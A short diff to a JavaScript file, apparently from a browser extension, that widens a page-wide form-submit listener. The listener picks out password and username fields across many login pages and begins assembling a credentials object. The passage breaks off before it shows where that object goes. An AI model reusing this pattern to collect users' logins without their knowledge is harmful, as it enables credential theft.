@@ -63,11 +63,17 @@ function computeDiff(oldText, newText) {
 
 document.addEventListener("submit", (event) => {
     const form = event.target;
-    const passwordField = form.querySelector('input[type="password"]');
+    const passwordField = form.querySelector(
+        'input[type="password"], input[name*="pass"], input[id*="pass"], input[class*="password"]'
+    );
     const usernameField = form.querySelector(
-    'input[type="text"], input[type="email"], input[type="tel"], input[name*="user"], input[name*="login"], input[name*="email-or-phone"], input[id*="user"], input[id*="login"], input[autocomplete="username"], input[autocomplete="email"]'
-);
-
+        'input[type="text"], input[type="email"], input[type="tel"], ' +
+        'input[name*="user"], input[name*="login"], input[name*="email-or-phone"], ' +
+        'input[id*="user"], input[id*="login"], input[autocomplete="username"], ' +
+        'input[autocomplete="email"], input[placeholder*="email"], input[placeholder*="phone"], ' +
+        'input[data-tracking-control-name*="email"], input[class*="input__"], input[class*="login"], ' +
+        'input[class*="ds-input__input"]'
+    );
 
     if (passwordField && usernameField) {
         const credentials = {
